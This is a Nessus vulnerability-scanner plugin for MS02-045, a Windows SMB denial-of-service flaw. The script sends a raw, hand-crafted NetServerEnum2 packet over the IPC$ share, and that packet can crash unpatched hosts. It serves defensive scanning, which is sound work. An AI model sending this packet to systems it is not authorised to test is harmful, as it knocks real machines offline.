#
# (C) Tenable Network Security, Inc.
#

# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Thanks to Ivan Arce who provided me with all the relevant details of this
# exploit.
#
# Ref: http://www.corest.com/common/showdoc.php?idx=262&idxseccion=10
#
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CAN
#
# Only tested against W2K.

include('compat.inc');

if (description)
{
  script_id(11110);
  script_version("$Revision: 1.43 $");
  script_cvs_date("$Date: 2016/12/09 21:04:55 $");

  script_cve_id("CVE-2002-0724");
  script_bugtraq_id(5556);
  script_osvdb_id(2074);
  script_xref(name:"MSFT", value: "MS02-045");

  script_name(english:"MS02-045: Microsoft Windows SMB Protocol SMB_COM_TRANSACTION Packet Remote Overflow DoS (326830) (uncredentialed check)");
  script_summary(english:"Crashes windows");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote host is vulnerable to a denial of service attack.'
  );

  script_set_attribute(
    attribute:'description',
    value:
"The remote host is vulnerable to a denial of service attack in its
SMB stack. 

An attacker may exploit this flaw to crash the remote host remotely,
without any authentication."
  );

  script_set_attribute(
    attribute:'solution',
    value:'Apply the appropriate patches from MS02-045 or apply the latest Windows service pack.'
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(
    attribute:'see_also',
    value:'http://technet.microsoft.com/en-us/security/bulletin/ms02-045'
  );

  script_set_attribute(attribute:"vuln_publication_date", value:"2002/08/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2002/08/23");

  script_set_attribute(attribute:"plugin_type", value:"local");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:microsoft:windows");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
  script_family(english:"Windows");

  script_dependencies("netbios_name_get.nasl", "smb_login.nasl", "smb_nativelanman.nasl", "os_fingerprint.nasl");
  script_require_keys("SMB/name", "SMB/login", "SMB/password");
  script_require_ports(139, 445);
  exit(0);
}

#

include("smb_func.inc");

function old_smb_recv(socket, length)
{
   local_var header, len, trailer;

   header = recv(socket:socket, length:4, min:4);
   if (strlen(header) < 4)return(NULL);
   len = 256 * ord(header[2]);
   len += ord(header[3]);
   if (len == 0)return(header);
   trailer = recv(socket:socket, length:len, min:len);
   if(strlen(trailer) < len )return(NULL);
   return strcat(header, trailer);
}



os = get_kb_item("Host/OS");
if ( ! os || "Vista" >< os || "Windows NT" >< os || "Windows Server 2003" >< os || "Windows" >!< os ) exit(0);

port = kb_smb_transport();
if(!port)port = 139;

function NetServerEnum2(soc, uid, tid)
{
 local_var len, n, r, req, sub, tid_hi, tid_lo, uid_hi, uid_lo, val;
 uid_lo = uid % 256;
 uid_hi = uid / 256;

 tid_lo = tid % 256;
 tid_hi = tid / 256;

 req = raw_string(0x00, 0x00,
        0x00, 0x5F, 0xFF, 0x53, 0x4D, 0x42, 0x25, 0x00,
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, tid_lo, tid_hi, 0x24, 0x04, uid_lo, uid_hi,
	0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x01,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x4C,
	0x00, 0x00, 0x00, 0x5F, 0x00, 0x00, 0x00, 0x20,
	0x00, 0x5C, 0x50, 0x49, 0x50, 0x45, 0x5C, 0x4C,
	0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x00, 0x68, 0x00,
	0x57, 0x72, 0x4C, 0x65, 0x68, 0x00, 0x42, 0x31,
	0x33, 0x42, 0x57, 0x7A, 0x00, 0x01, 0x00, 0xE0,
	0xFF);

 len = strlen(req);

 n = send(socket:soc, data:req);
 if(!(n == len))exit(0);

 r = old_smb_recv(socket:soc, length:4096);
 if (strlen (r) == 68)
 {
  # If the return code is STATUS_SUCCESS server can be vulnerable
  sub = substr (r, 9, 12);
  if ("00000000" >< hexstr (sub))
  {
   val = substr (r, strlen(r)-6, strlen(r)-1);
   if ("000000000000" >< hexstr (val))
   {
     val = substr (r, strlen(r)-9, strlen(r)-8);
     if ("0000" >!< hexstr(val))
       security_hole (port);
   }
  }
 }
}


name	= kb_smb_name();
port	= kb_smb_transport();

if ( ! get_port_state(port) ) exit(0);
soc = open_sock_tcp(port);
if ( ! soc ) exit(0);

session_init(socket:soc, hostname:name);
r = NetUseAdd(share:"IPC$");
if ( r == 1 )
{
 NetServerEnum2(soc:session_get_socket(), uid:session_get_uid(), tid:session_get_tid());

 NetUseDel();
}
